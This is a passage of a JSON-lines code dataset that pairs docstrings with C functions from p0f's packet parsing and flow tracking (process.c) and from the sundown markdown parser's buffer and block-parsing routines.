(f->next_cli_seq - pk->pay_len != pk->seq)\n            DEBUG(\"[#] Expected client seq 0x%08x, got 0x%08x.\\n\", f->next_cli_seq, pk->seq);\n \n          return;\n        }\n\n        /* Append data */\n\n        if (f->req_len < MAX_FLOW_DATA && pk->pay_len) {\n\n          u32 read_amt = MIN(pk->pay_len, MAX_FLOW_DATA - f->req_len);\n\n          f->request = ck_realloc_kb(f->request, f->req_len + read_amt + 1);\n          memcpy(f->request + f->req_len, pk->payload, read_amt);\n          f->req_len += read_amt;\n\n        }\n\n        check_ts_tcp(1, pk, f);\n\n        f->next_cli_seq += pk->pay_len;\n\n      } else {\n\n        if (f->next_srv_seq != pk->seq) {\n\n          /* Not a simple dupe? */\n\n          if (f->next_srv_seq - pk->pay_len != pk->seq)\n            DEBUG(\"[#] Expected server seq 0x%08x, got 0x%08x.\\n\",\n                  f->next_cli_seq, pk->seq);\n \n          return;\n\n        }\n\n        /* Append data */\n\n        if (f->resp_len < MAX_FLOW_DATA && pk->pay_len) {\n\n          u32 read_amt = MIN(pk->pay_len, MAX_FLOW_DATA - f->resp_len);\n\n          f->response = ck_realloc_kb(f->response, f->resp_len + read_amt + 1);\n          memcpy(f->response + f->resp_len, pk->payload, read_amt);\n          f->resp_len += read_amt;\n\n        }\n\n        check_ts_tcp(0, pk, f);\n\n        f->next_srv_seq += pk->pay_len;\n\n      }\n\n      if (!pk->pay_len) return;\n\n      need_more |= process_http(to_srv, f);\n\n      if (!need_more) {\n\n        DEBUG(\"[#] All modules done, no need to keep tracking flow.\\n\");\n        destroy_flow(f);\n\n      } else if (f->req_len >= MAX_FLOW_DATA && f->resp_len >= MAX_FLOW_DATA) {\n\n        DEBUG(\"[#] Per-flow capture size limit exceeded.\\n\");\n        destroy_flow(f);\n\n      }\n\n      break;\n\n    default:\n\n      WARN(\"Huh. Unexpected packet type 0x%02x in flow_dispatch().\", pk->tcp_type);\n\n  }\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Look up host data. */\n", "func_signal": "struct host_data* lookup_host(u8* addr, u8 ip_ver)", "code": "{\n\n  u32 bucket = get_host_bucket(addr, ip_ver);\n  struct host_data* h = host_b[bucket];\n\n  while (CP(h)) {\n\n    if (ip_ver == h->ip_ver &&\n        !memcmp(addr, h->addr, (h->ip_ver == IP_VER4) ? 4 : 16))\n      return h;\n\n    h = h->next;\n\n  }\n\n  return NULL;\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Add NAT score, check if alarm due. */\n", "func_signal": "void add_nat_score(u8 to_srv, struct packet_flow* f, u16 reason, u8 score)", "code": "{\n\n  static u8 rea[1024];\n\n  struct host_data* hd;\n  u8 *scores, *rptr = rea;\n  u32 i;\n  u8  over_5 = 0, over_2 = 0, over_1 = 0, over_0 = 0;\n\n  if (to_srv) {\n\n    hd = f->client;\n    scores = hd->cli_scores;\n\n  } else {\n\n    hd = f->server;\n    scores = hd->srv_scores;\n\n  }\n\n  memmove(scores, scores + 1, NAT_SCORES - 1);\n  scores[NAT_SCORES - 1] = score;\n  hd->nat_reasons |= reason;\n\n  if (!score) return;\n\n  for (i = 0; i < NAT_SCORES; i++) switch (scores[i]) {\n    case 6 ... 255: over_5++;\n    case 3 ... 5:   over_2++;\n    case 2:         over_1++;\n    case 1:         over_0++;\n  }\n\n  if (over_5 > 2 || over_2 > 4 || over_1 > 6 || over_0 > 8) {\n\n    start_observation(\"ip sharing\", 2, to_srv, f);\n\n    reason = hd->nat_reasons;\n\n    hd->last_nat = get_unix_time();\n\n    memset(scores, 0, NAT_SCORES);\n    hd->nat_reasons = 0;\n\n  } else {\n\n    /* Wait for something more substantial. */\n    if (score == 1) return;\n\n    start_observation(\"host change\", 2, to_srv, f);\n\n    hd->last_chg = get_unix_time();\n\n  }\n\n  *rptr = 0;\n\n#define REAF(_par...) do { \\\n    rptr += sprintf((char*)rptr, _par); \\\n  } while (0) \n\n  if (reason & NAT_APP_SIG)  REAF(\" app_vs_os\");\n  if (reason & NAT_OS_SIG)   REAF(\" os_diff\");\n  if (reason & NAT_UNK_DIFF) REAF(\" sig_diff\");\n  if (reason & NAT_TO_UNK)   REAF(\" x_known\");\n  if (reason & NAT_TS)       REAF(\" tstamp\");\n  if (reason & NAT_TTL)      REAF(\" ttl\");\n  if (reason & NAT_PORT)     REAF(\" port\");\n  if (reason & NAT_MSS)      REAF(\" mtu\");\n  if (reason & NAT_FUZZY)    REAF(\" fuzzy\");\n\n  if (reason & NAT_APP_VIA)  REAF(\" via\");\n  if (reason & NAT_APP_DATE) REAF(\" date\");\n  if (reason & NAT_APP_LB)   REAF(\" srv_sig_lb\");\n  if (reason & NAT_APP_UA)   REAF(\" ua_vs_os\");\n\n#undef REAF\n\n  add_observation_field(\"reason\", rea[0] ? (rea + 1) : NULL);\n\n  OBSERVF(\"raw_hits\", \"%u,%u,%u,%u\", over_5, over_2, over_1, over_0);\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Destroy a flow. */\n", "func_signal": "static void destroy_flow(struct packet_flow* f)", "code": "{\n\n  CP(f);\n  CP(f->client);\n  CP(f->server);\n\n  DEBUG(\"[#] Destroying flow: %s/%u -> \",\n        addr_to_str(f->client->addr, f->client->ip_ver), f->cli_port);\n\n  DEBUG(\"%s/%u (bucket %u)\\n\",\n        addr_to_str(f->server->addr, f->server->ip_ver), f->srv_port,\n        f->bucket);\n\n  /* Remove it from the bucketed linked list. */\n\n  if (CP(f->next)) f->next->prev = f->prev;\n  \n  if (CP(f->prev)) f->prev->next = f->next;\n  else { CP(flow_b[f->bucket]); flow_b[f->bucket] = f->next; }\n\n  /* Remove from the by-age linked list. */\n\n  if (CP(f->newer)) f->newer->older = f->older;\n  else { CP(newest_flow); newest_flow = f->older; }\n\n  if (CP(f->older)) f->older->newer = f->newer;\n  else flow_by_age = f->newer; \n\n  /* Free memory, etc. */\n\n  f->client->use_cnt--;\n  f->server->use_cnt--;\n\n  free_sig_hdrs(&f->http_tmp);\n\n  ck_free(f->request);\n  ck_free(f->response);\n  ck_free(f);\n\n  flow_cnt--;  \n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Create flow, and host data if necessary. If counts exceeded, prune old. */\n", "func_signal": "static struct packet_flow* create_flow_from_syn(struct packet_data* pk)", "code": "{\n\n  u32 bucket = get_flow_bucket(pk);\n  struct packet_flow* nf;\n\n  if (flow_cnt > max_conn) nuke_flows(0);\n\n  DEBUG(\"[#] Creating flow from SYN: %s/%u -> \",\n        addr_to_str(pk->src, pk->ip_ver), pk->sport);\n\n  DEBUG(\"%s/%u (bucket %u)\\n\",\n        addr_to_str(pk->dst, pk->ip_ver), pk->dport, bucket);\n\n  nf = ck_alloc(sizeof(struct packet_flow));\n\n  nf->client = lookup_host(pk->src, pk->ip_ver);\n\n  if (nf->client) touch_host(nf->client);\n  else nf->client = create_host(pk->src, pk->ip_ver);\n\n  nf->server = lookup_host(pk->dst, pk->ip_ver);\n\n  if (nf->server) touch_host(nf->server);\n  else nf->server = create_host(pk->dst, pk->ip_ver);\n\n  nf->client->use_cnt++;\n  nf->server->use_cnt++;\n\n  nf->client->total_conn++;\n  nf->server->total_conn++;\n\n  /* Insert into the bucketed linked list.*/\n\n  if (CP(flow_b[bucket])) {\n    flow_b[bucket]->prev = nf;\n    nf->next = flow_b[bucket];\n  }\n\n  flow_b[bucket] = nf;\n\n  /* Insert into the by-age linked list */\n \n  if (CP(newest_flow)) {\n    newest_flow->newer = nf;\n    nf->older = newest_flow;\n  } else flow_by_age = nf;\n\n  newest_flow = nf;\n\n  /* Populate other data */\n\n  nf->cli_port = pk->sport;\n  nf->srv_port = pk->dport;\n  nf->bucket   = bucket;\n  nf->created  = get_unix_time();\n\n  nf->next_cli_seq = pk->seq + 1;\n\n  flow_cnt++;\n  return nf;\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Convert IPv4 or IPv6 address to a human-readable form. */\n", "func_signal": "u8* addr_to_str(u8* data, u8 ip_ver)", "code": "{\n\n  static char tmp[128];\n\n  /* We could be using inet_ntop(), but on systems that have older libc\n     but still see passing IPv6 traffic, we would be in a pickle. */\n\n  if (ip_ver == IP_VER4) {\n\n    sprintf(tmp, \"%u.%u.%u.%u\", data[0], data[1], data[2], data[3]);\n\n  } else {\n\n    sprintf(tmp, \"%x:%x:%x:%x:%x:%x:%x:%x\",\n            (data[0] << 8) | data[1], (data[2] << 8) | data[3], \n            (data[4] << 8) | data[5], (data[6] << 8) | data[7], \n            (data[8] << 8) | data[9], (data[10] << 8) | data[11], \n            (data[12] << 8) | data[13], (data[14] << 8) | data[15]);\n\n  }\n\n  return (u8*)tmp;\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Go through host and flow cache, expire outdated items. */\n", "func_signal": "static void expire_cache(void)", "code": "{\n  struct host_data* target;\n  static u32 pt;\n\n  u32 ct = get_unix_time();\n\n  if (ct == pt) return;\n  pt = ct;\n\n  DEBUG(\"[#] Cache expiration kicks in...\\n\");\n\n  while (CP(flow_by_age) && ct - flow_by_age->created > conn_max_age)\n    destroy_flow(flow_by_age);\n\n  target = host_by_age;\n\n  while (CP(target) && ct - target->last_seen > host_idle_limit * 60) {\n    struct host_data* newer = target->newer;\n    if (!target->use_cnt) destroy_host(target);\n    target = newer;\n  }\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Parse PCAP input, with plenty of sanity checking. Store interesting details\n   in a protocol-agnostic buffer that will be then examined upstream. */\n", "func_signal": "void parse_packet(void* junk, const struct pcap_pkthdr* hdr, const u8* data)", "code": "{\n\n  struct tcp_hdr* tcp;\n  struct packet_data pk;\n\n  s32 packet_len;\n  u32 tcp_doff;\n\n  u8* opt_end;\n\n  packet_cnt++;\n  \n  cur_time = (struct timeval*)&hdr->ts;\n\n  if (!(packet_cnt % EXPIRE_INTERVAL)) expire_cache();\n\n  /* Be paranoid about how much data we actually have off the wire. */\n\n  packet_len = MIN(hdr->len, hdr->caplen);\n  if (packet_len > SNAPLEN) packet_len = SNAPLEN;\n\n  // DEBUG(\"[#] Received packet: len = %d, caplen = %d, limit = %d\\n\",\n  //    hdr->len, hdr->caplen, SNAPLEN);\n\n  /* Account for link-level headers. */\n\n  if (link_off < 0) find_offset(data, packet_len);\n\n  if (link_off > 0) {\n\n    data += link_off;\n    packet_len -= link_off;\n\n  }\n\n  /* If there is no way we could have received a complete TCP packet, bail\n     out early. */\n\n  if (packet_len < MIN_TCP4) {\n    DEBUG(\"[#] Packet too short for any IPv4 + TCP headers, giving up!\\n\");\n    return;\n  }\n\n  pk.quirks = 0;\n\n  if ((*data >> 4) == IP_VER4) {\n\n    /************************\n     * IPv4 header parsing. *\n     ************************/\n    \n    const struct ipv4_hdr* ip4 = (struct ipv4_hdr*)data;\n\n    u32 hdr_len = (ip4->ver_hlen & 0x0F) * 4;\n    u16 flags_off = ntohs(RD16(ip4->flags_off));\n    u16 tot_len = ntohs(RD16(ip4->tot_len));\n\n    /* If the packet claims to be shorter than what we received off the wire,\n       honor this claim to account for etherleak-type bugs. */\n\n    if (packet_len > tot_len) {\n      packet_len = tot_len;\n      // DEBUG(\"[#] ipv4.tot_len = %u, adjusted accordingly.\\n\", tot_len);\n    }\n\n    /* Bail out if the result leaves no room for IPv4 + TCP headers. */\n\n    if (packet_len < MIN_TCP4) {\n      DEBUG(\"[#] packet_len = %u. Too short for IPv4 + TCP, giving up!\\n\",\n            packet_len);\n      return;\n    }\n\n    /* Bail out if the declared length of IPv4 headers is nonsensical. */\n\n    if (hdr_len < sizeof(struct ipv4_hdr)) {\n      DEBUG(\"[#] ipv4.hdr_len = %u. Too short for IPv4, giving up!\\n\",\n            hdr_len);\n      return;\n    }\n\n    /* If the packet claims to be longer than the recv buffer, best to back\n       off - even though we could just ignore this and recover. */\n\n    if (tot_len > packet_len) {\n      DEBUG(\"[#] ipv4.tot_len = %u but packet_len = %u, bailing out!\\n\",\n            tot_len, packet_len);\n      return;\n    }\n\n    /* And finally, bail out if after skipping the IPv4 header as specified\n       (including options), there wouldn't be enough room for TCP. */\n\n    if (hdr_len + sizeof(struct tcp_hdr) > packet_len) {\n      DEBUG(\"[#] ipv4.hdr_len = %u, packet_len = %d, no room for TCP!\\n\",\n            hdr_len, packet_len);\n      return;\n    }\n\n    /* Bail out if the subsequent protocol is not TCP. */\n\n    if (ip4->proto != PROTO_TCP) {\n      DEBUG(\"[#] Whoa, IPv4 packet with non-TCP payload (%u)?\\n\", ip4->proto);\n      return;\n    }\n\n    /* Ignore any traffic with MF or non-zero fragment offset specified. We\n       can do enough just fingerprinting the non-fragmented traffic. */\n\n    if (flags_off & ~(IP4_DF | IP4_MBZ)) {\n      DEBUG(\"[#] Packet fragment (0x%04x), letting it slide!\\n\", flags_off);\n      return;\n    }\n\n    /* Store some relevant information about the packet. */\n\n    pk.ip_ver = IP_VER4;\n\n    pk.ip_opt_len = hdr_len - 20;\n\n    memcpy(pk.src, ip4->src, 4);\n    memcpy(pk.dst, ip4->dst, 4);\n\n    pk.tos = ip4->tos_ecn >> 2;\n\n    pk.ttl = ip4->ttl;\n\n    if (ip4->tos_ecn & (IP_TOS_CE | IP_TOS_ECT)) pk.quirks |= QUIRK_ECN;\n\n    /* Tag some of the corner cases associated with implementation quirks. */\n    \n    if (flags_off & IP4_MBZ) pk.quirks |= QUIRK_NZ_MBZ;\n\n    if (flags_off & IP4_DF) {\n\n      pk.quirks |= QUIRK_DF;\n      if (RD16(ip4->id)) pk.quirks |= QUIRK_NZ_ID;\n\n    } else {\n\n      if (!RD16(ip4->id)) pk.quirks |= QUIRK_ZERO_ID;\n\n    }\n\n    pk.tot_hdr = hdr_len;\n\n    tcp = (struct tcp_hdr*)(data + hdr_len);\n    packet_len -= hdr_len;\n    \n  } else if ((*data >> 4) == IP_VER6) {\n\n    /************************\n     * IPv6 header parsing. *\n     ************************/\n    \n    const struct ipv6_hdr* ip6 = (struct ipv6_hdr*)data;\n    u32 ver_tos = ntohl(RD32(ip6->ver_tos));\n    u32 tot_len = ntohs(RD16(ip6->pay_len)) + sizeof(struct ipv6_hdr);\n\n    /* If the packet claims to be shorter than what we received off the wire,\n       honor this claim to account for etherleak-type bugs. */\n\n    if (packet_len > tot_len) {\n      packet_len = tot_len;\n      // DEBUG(\"[#] ipv6.tot_len = %u, adjusted accordingly.\\n\", tot_len);\n    }\n\n    /* Bail out if the result leaves no room for IPv6 + TCP headers. */\n\n    if (packet_len < MIN_TCP6) {\n      DEBUG(\"[#] packet_len = %u. Too short for IPv6 + TCP, giving up!\\n\",\n            packet_len);\n      return;\n    }\n\n    /* If the packet claims to be longer than the data we have, best to back\n       off - even though we could just ignore this and recover. */\n\n    if (tot_len > packet_len) {\n      DEBUG(\"[#] ipv6.tot_len = %u but packet_len = %u, bailing out!\\n\",\n            tot_len, packet_len);\n      return;\n    }\n\n    /* Bail out if the subsequent protocol is not TCP. One day, we may try\n       to parse and skip IPv6 extensions, but there seems to be no point in\n       it today. */\n\n    if (ip6->proto != PROTO_TCP) {\n      DEBUG(\"[#] IPv6 packet with non-TCP payload (%u).\\n\", ip6->proto);\n      return;\n    }\n\n    /* Store some relevant information about the packet. */\n\n    pk.ip_ver = IP_VER6;\n\n    pk.ip_opt_len = 0;\n\n    memcpy(pk.src, ip6->src, 16);\n    memcpy(pk.dst, ip6->dst, 16);\n\n    pk.tos = (ver_tos >> 22) & 0x3F;\n\n    pk.ttl = ip6->ttl;\n\n    if (ver_tos & 0xFFFFF) pk.quirks |= QUIRK_FLOW;\n\n    if ((ver_tos >> 20) & (IP_TOS_CE | IP_TOS_ECT)) pk.quirks |= QUIRK_ECN;\n\n    pk.tot_hdr = sizeof(struct ipv6_hdr);\n\n    tcp = (struct tcp_hdr*)(ip6 + 1);\n    packet_len -= sizeof(struct ipv6_hdr);\n\n  } else {\n\n    if (!bad_packets) {\n      WARN(\"Unknown packet type %u, link detection issue?\", *data >> 4);\n      bad_packets = 1;\n    }\n\n    return;\n\n  }\n\n  /***************\n   * TCP parsing *\n   ***************/\n\n  data = (u8*)tcp;\n\n  tcp_doff = (tcp->doff_rsvd >> 4) * 4;\n\n  /* As usual, let's start with sanity checks. */\n\n  if (tcp_doff < sizeof(struct tcp_hdr)) {\n    DEBUG(\"[#] tcp.hdr_len = %u, not enough for TCP!\\n\", tcp_doff);\n    return;\n  }\n\n  if (tcp_doff > packet_len) {\n    DEBUG(\"[#] tcp.hdr_len = %u, past end of packet!\\n\", tcp_doff);\n    return;\n  }\n\n  pk.tot_hdr += tcp_doff;\n\n  pk.sport = ntohs(RD16(tcp->sport));\n  pk.dport = ntohs(RD16(tcp->dport));\n\n  pk.tcp_type = tcp->flags & (TCP_SYN | TCP_ACK | TCP_FIN | TCP_RST);\n\n  /* NUL, SYN+FIN, SYN+RST, FIN+RST, etc, should go to /dev/null. */\n\n  if (((tcp->flags & TCP_SYN) && (tcp->flags & (TCP_FIN | TCP_RST))) ||\n      ((tcp->flags & TCP_FIN) && (tcp->flags & TCP_RST)) ||\n      !pk.tcp_type) {\n\n    DEBUG(\"[#] Silly combination of TCP flags: 0x%02x.\\n\", tcp->flags);\n    return;\n\n  }\n\n  pk.win = ntohs(RD16(tcp->win));\n\n  pk.seq = ntohl(RD32(tcp->seq));\n\n  /* Take note of miscellanous features and quirks. */\n\n  if ((tcp->flags & (TCP_ECE | TCP_CWR)) || \n      (tcp->doff_rsvd & TCP_NS_RES)) pk.quirks |= QUIRK_ECN;\n\n  if (!pk.seq) pk.quirks |= QUIRK_ZERO_SEQ;\n\n  if (tcp->flags & TCP_ACK) {\n\n    if (!RD32(tcp->ack)) pk.quirks |= QUIRK_ZERO_ACK;\n\n  } else {\n\n    /* A good proportion of RSTs tend to have \"illegal\" ACK numbers, so\n       ignore these. */\n\n    if (RD32(tcp->ack) & !(tcp->flags & TCP_RST)) {\n\n      DEBUG(\"[#] Non-zero ACK on a non-ACK packet: 0x%08x.\\n\",\n            ntohl(RD32(tcp->ack)));\n\n      pk.quirks |= QUIRK_NZ_ACK;\n\n    }\n\n  }\n\n  if (tcp->flags & TCP_URG) {\n\n    pk.quirks |= QUIRK_URG;\n\n  } else {\n\n    if (RD16(tcp->urg)) {\n\n      DEBUG(\"[#] Non-zero UPtr on a non-URG packet: 0x%08x.\\n\",\n            ntohl(RD16(tcp->urg)));\n\n      pk.quirks |= QUIRK_NZ_URG;\n\n    }\n\n  }\n\n  if (tcp->flags & TCP_PUSH) pk.quirks |= QUIRK_PUSH;\n\n  /* Handle payload data. */\n\n  if (tcp_doff == packet_len) {\n\n    pk.payload = NULL;\n    pk.pay_len = 0;\n\n  } else {\n\n    pk.payload = (u8*)data + tcp_doff;\n    pk.pay_len = packet_len - tcp_doff;\n\n  }\n\n  /**********************\n   * TCP option parsing *\n   **********************/\n\n  opt_end = (u8*)data + tcp_doff; /* First byte of non-option data */\n  data = (u8*)(tcp + 1);\n\n  pk.opt_cnt     = 0;\n  pk.opt_eol_pad = 0;\n  pk.mss         = 0;\n  pk.wscale      = 0;\n  pk.ts1         = 0;\n\n  /* Option parsing problems are non-fatal, but we want to keep track of\n     them to spot buggy TCP stacks. */\n\n  while (data < opt_end && pk.opt_cnt < MAX_TCP_OPT) {\n\n    pk.opt_layout[pk.opt_cnt++] = *data;\n\n    switch (*data++) {\n\n      case TCPOPT_EOL:\n\n        /* EOL is a single-byte option that aborts further option parsing.\n           Take note of how many bytes of option data are left, and if any of\n           them are non-zero. */\n\n        pk.opt_eol_pad = opt_end - data;\n        \n        while (data < opt_end && !*data++);\n\n        if (data != opt_end) {\n          pk.quirks |= QUIRK_OPT_EOL_NZ;\n          data = opt_end;\n        }\n\n        break;\n\n      case TCPOPT_NOP:\n\n        /* NOP is a single-byte option that does nothing. */\n\n        break;\n  \n      case TCPOPT_MAXSEG:\n\n        /* MSS is a four-byte option with specified size. */\n\n        if (data + 3 > opt_end) {\n          DEBUG(\"[#] MSS option would end past end of header (%u left).\\n\",\n                opt_end - data);\n          goto abort_options;\n        }\n\n        if (*data != 4) {\n          DEBUG(\"[#] MSS option expected to have 4 bytes, not %u.\\n\", *data);\n          pk.quirks |= QUIRK_OPT_BAD;\n        }\n\n        pk.mss = ntohs(RD16p(data+1));\n\n        data += 3;\n\n        break;\n\n      case TCPOPT_WSCALE:\n\n        /* WS is a three-byte option with specified size. */\n\n        if (data + 2 > opt_end) {\n          DEBUG(\"[#] WS option would end past end of header (%u left).\\n\",\n                opt_end - data);\n          goto abort_options;\n        }\n\n        if (*data != 3) {\n          DEBUG(\"[#] WS option expected to have 3 bytes, not %u.\\n\", *data);\n          pk.quirks |= QUIRK_OPT_BAD;\n        }\n\n        pk.wscale = data[1];\n\n        if (pk.wscale > 14) pk.quirks |= QUIRK_OPT_EXWS;\n\n        data += 2;\n\n        break;\n\n      case TCPOPT_SACKOK:\n\n        /* SACKOK is a two-byte option with specified size. */\n\n        if (data + 1 > opt_end) {\n          DEBUG(\"[#] SACKOK option would end past end of header (%u left).\\n\",\n                opt_end - data);\n          goto abort_options;\n        }\n\n        if (*data != 2) {\n          DEBUG(\"[#] SACKOK option expected to have 2 bytes, not %u.\\n\", *data);\n          pk.quirks |= QUIRK_OPT_BAD;\n        }\n\n        data++;\n\n        break;\n\n      case TCPOPT_SACK:\n\n        /* SACK is a variable-length option of 10 to 34 bytes. Because we don't\n           know the size any better, we need to bail out if it looks wonky. */\n\n        if (data == opt_end) {\n          DEBUG(\"[#] SACK option without room for length field.\");\n          goto abort_options;\n        }\n\n        if (*data < 10 || *data > 34) {\n          DEBUG(\"[#] SACK length out of range (%u), bailing out.\\n\", *data);\n          goto abort_options;\n        }\n\n        if (data - 1 + *data > opt_end) {\n          DEBUG(\"[#] SACK option (len %u) is too long (%u left).\\n\",\n                *data, opt_end - data);\n          goto abort_options;\n        }\n\n        data += *data - 1;\n\n        break;\n\n      case TCPOPT_TSTAMP:\n\n        /* Timestamp is a ten-byte option with specified size. */\n\n        if (data + 9 > opt_end) {\n          DEBUG(\"[#] TStamp option would end past end of header (%u left).\\n\",\n                opt_end - data);\n          goto abort_options;\n        }\n\n        if (*data != 10) {\n          DEBUG(\"[#] TStamp option expected to have 10 bytes, not %u.\\n\",\n                *data);\n          pk.quirks |= QUIRK_OPT_BAD;\n        }\n\n        pk.ts1 = ntohl(RD32p(data + 1));\n\n        if (!pk.ts1) pk.quirks |= QUIRK_OPT_ZERO_TS1;\n\n        if (pk.tcp_type == TCP_SYN && RD32p(data + 5)) {\n\n          DEBUG(\"[#] Non-zero second timestamp: 0x%08x.\\n\",\n                ntohl(*(u32*)(data + 5)));\n\n          pk.quirks |= QUIRK_OPT_NZ_TS2;\n\n        }\n\n        data += 9;\n\n        break;\n\n      default:\n\n        /* Unknown option, presumably with specified size. */\n\n        if (data == opt_end) {\n          DEBUG(\"[#] Unknown option 0x%02x without room for length field.\",\n                data[-1]);\n          goto abort_options;\n        }\n\n        if (*data < 2 || *data > 40) {\n          DEBUG(\"[#] Unknown option 0x%02x has invalid length %u.\\n\",\n                data[-1], *data);\n          goto abort_options;\n        }\n\n        if (data - 1 + *data > opt_end) {\n          DEBUG(\"[#] Unknown option 0x%02x (len %u) is too long (%u left).\\n\",\n                data[-1], *data, opt_end - data);\n          goto abort_options;\n        }\n\n        data += *data - 1;\n\n    }\n\n  }\n\n  if (data != opt_end) {\n\nabort_options:\n\n    DEBUG(\"[#] Option parsing aborted (cnt = %u, remainder = %u).\\n\",\n          pk.opt_cnt, opt_end - data);\n\n    pk.quirks |= QUIRK_OPT_BAD;\n\n  }\n\n  flow_dispatch(&pk);\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Look up an existing flow. */\n", "func_signal": "static struct packet_flow* lookup_flow(struct packet_data* pk, u8* to_srv)", "code": "{\n\n  u32 bucket = get_flow_bucket(pk);\n  struct packet_flow* f = flow_b[bucket];\n\n  while (CP(f)) {\n\n    CP(f->client);\n    CP(f->server);\n\n    if (pk->ip_ver != f->client->ip_ver) goto lookup_next;\n\n    if (pk->sport == f->cli_port && pk->dport == f->srv_port &&\n        !memcmp(pk->src, f->client->addr, (pk->ip_ver == IP_VER4) ? 4 : 16) &&\n        !memcmp(pk->dst, f->server->addr, (pk->ip_ver == IP_VER4) ? 4 : 16)) {\n\n      *to_srv = 1;\n      return f;\n\n    }\n\n    if (pk->dport == f->cli_port && pk->sport == f->srv_port &&\n        !memcmp(pk->dst, f->client->addr, (pk->ip_ver == IP_VER4) ? 4 : 16) &&\n        !memcmp(pk->src, f->server->addr, (pk->ip_ver == IP_VER4) ? 4 : 16)) {\n\n      *to_srv = 0;\n      return f;\n\n    }\n\nlookup_next:\n\n    f = f->next;\n\n  }\n\n  return NULL;\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* char_linebreak \u2022 '\\n' preceded by two spaces (assuming linebreak != 0) */\n", "func_signal": "static size_t\nchar_linebreak(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t offset, size_t size)", "code": "{\n\tif (offset < 2 || data[-1] != ' ' || data[-2] != ' ')\n\t\treturn 0;\n\n\t/* removing the last space from ob and rendering */\n\twhile (ob->size && ob->data[ob->size - 1] == ' ')\n\t\tob->size--;\n\n\treturn rndr->cb.linebreak(ob, rndr->opaque) ? 1 : 0;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* bufgrow: increasing the allocated size to the given value */\n", "func_signal": "int\nbufgrow(struct buf *buf, size_t neosz)", "code": "{\n\tsize_t neoasz;\n\tvoid *neodata;\n\n\tassert(buf && buf->unit);\n\n\tif (neosz > BUFFER_MAX_ALLOC_SIZE)\n\t\treturn BUF_ENOMEM;\n\n\tif (buf->asize >= neosz)\n\t\treturn BUF_OK;\n\n\tneoasz = buf->asize + buf->unit;\n\twhile (neoasz < neosz)\n\t\tneoasz += buf->unit;\n\n\tneodata = realloc(buf->data, neoasz);\n\tif (!neodata)\n\t\treturn BUF_ENOMEM;\n\n\tbuf->data = neodata;\n\tbuf->asize = neoasz;\n\treturn BUF_OK;\n}", "path": "src\\sundown\\buffer.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* prefix_quote \u2022 returns blockquote prefix length */\n", "func_signal": "static size_t\nprefix_quote(uint8_t *data, size_t size)", "code": "{\n\tsize_t i = 0;\n\tif (i < size && data[i] == ' ') i++;\n\tif (i < size && data[i] == ' ') i++;\n\tif (i < size && data[i] == ' ') i++;\n\n\tif (i < size && data[i] == '>') {\n\t\tif (i + 1 < size && data[i + 1] == ' ')\n\t\t\treturn i + 2;\n\n\t\treturn i + 1;\n\t}\n\n\treturn 0;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* bufputc: appends a single uint8_t to a buffer */\n", "func_signal": "void\nbufputc(struct buf *buf, int c)", "code": "{\n\tassert(buf && buf->unit);\n\n\tif (buf->size + 1 > buf->asize && bufgrow(buf, buf->size + 1) < 0)\n\t\treturn;\n\n\tbuf->data[buf->size] = c;\n\tbuf->size += 1;\n}", "path": "src\\sundown\\buffer.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* htmlblock_end \u2022 checking end of HTML block : </tag>[ \\t]*\\n[ \\t*]\\n */\n/*\treturns the length on match, 0 otherwise */\n", "func_signal": "static size_t\nhtmlblock_end_tag(\n\tconst char *tag,\n\tsize_t tag_len,\n\tstruct sd_markdown *rndr,\n\tuint8_t *data,\n\tsize_t size)", "code": "{\n\tsize_t i, w;\n\n\t/* checking if tag is a match */\n\tif (tag_len + 3 >= size ||\n\t\tstrncasecmp((char *)data + 2, tag, tag_len) != 0 ||\n\t\tdata[tag_len + 2] != '>')\n\t\treturn 0;\n\n\t/* checking white lines */\n\ti = tag_len + 3;\n\tw = 0;\n\tif (i < size && (w = is_empty(data + i, size - i)) == 0)\n\t\treturn 0; /* non-blank after tag */\n\ti += w;\n\tw = 0;\n\n\tif (i < size)\n\t\tw = is_empty(data + i, size - i);\n\n\treturn i + w;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/***************************\n * HELPER FUNCTIONS *\n ***************************/\n", "func_signal": "static inline struct buf *\nrndr_newbuf(struct sd_markdown *rndr, int type)", "code": "{\n\tstatic const size_t buf_size[2] = {256, 64};\n\tstruct buf *work = NULL;\n\tstruct stack *pool = &rndr->work_bufs[type];\n\n\tif (pool->size < pool->asize &&\n\t\tpool->item[pool->size] != NULL) {\n\t\twork = pool->item[pool->size++];\n\t\twork->size = 0;\n\t} else {\n\t\twork = bufnew(buf_size[type]);\n\t\tstack_push(pool, work);\n\t}\n\n\treturn work;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
